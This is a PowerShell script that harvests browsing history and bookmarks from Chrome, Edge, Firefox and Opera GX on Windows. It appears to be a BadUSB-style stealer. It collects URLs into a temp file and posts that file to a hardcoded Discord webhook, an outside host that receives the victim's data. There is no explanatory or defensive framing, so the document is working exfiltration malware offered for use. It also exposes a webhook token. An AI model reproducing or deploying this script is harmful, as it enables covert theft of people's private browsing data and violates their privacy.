function Get-BrowserData {
    [CmdletBinding()]
    param (	
        [Parameter (Position=1,Mandatory = $True)]
        [string]$Browser,    
        [Parameter (Position=1,Mandatory = $True)]
        [string]$DataType 
    ) 

    Write-Host "Getting data for $Browser $DataType..."

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if ($Browser -eq 'chrome' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    } elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    } elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    } elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
        $Path = "$env:USERPROFILE\Appdata\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    } elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
        $Path = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory -Filter "*default*" | Select-Object -ExpandProperty FullName | ForEach-Object { "$_\places.sqlite" }
    } elseif ($Browser -eq 'opera' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    } elseif ($Browser -eq 'opera' -and $DataType -eq 'bookmarks') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
    }

    if (!(Test-Path $Path)) {
        Write-Warning "Path $Path not found"
        return
    }

    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    }
}


$BrowserDataPath = "$env:TMP/--BrowserData.txt"

Get-BrowserData -Browser "edge" -DataType "history" >> $BrowserDataPath

Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $BrowserDataPath

Get-BrowserData -Browser "chrome" -DataType "history" >> $BrowserDataPath

Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $BrowserDataPath

Get-BrowserData -Browser "firefox" -DataType "history" >> $BrowserDataPath

Get-BrowserData -Browser "opera" -DataType "history" >> $BrowserDataPath

Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $BrowserDataPath

function Upload-Discord {

    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )
    
    $hookurl = "https://discord.com/api/webhooks/1101079563959808120/UyOetgCEvbNqODpOAkCqzc2oiqHZA2bz85R2SqY52FhPxFFrsc34nsjdn-N_2X0VG6Ea"
    
    $Body = @{
      'username' = $env:username
      'content' = $text
    }
    
    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    }
    
    if (-not ([string]::IsNullOrEmpty($file))){
        $data = [IO.File]::ReadAllBytes($file)
        $form = new-object System.Net.Http.FormUrlEncodedContent @{content=$text}
        $client = new-object System.Net.Http.HttpClient
        $client.DefaultRequestHeaders.Add("Authorization", "Bot <bot_token>")
        $response = $client.PostAsync($hookurl, $form).Result
        $content = [Text.Encoding]::UTF8.GetString($response.Content.ReadAsByteArrayAsync().Result)
    }
}

if (-not ([string]::IsNullOrEmpty($dc))){
Upload-Discord -file $BrowserDataPath -text "Browser data"
}   
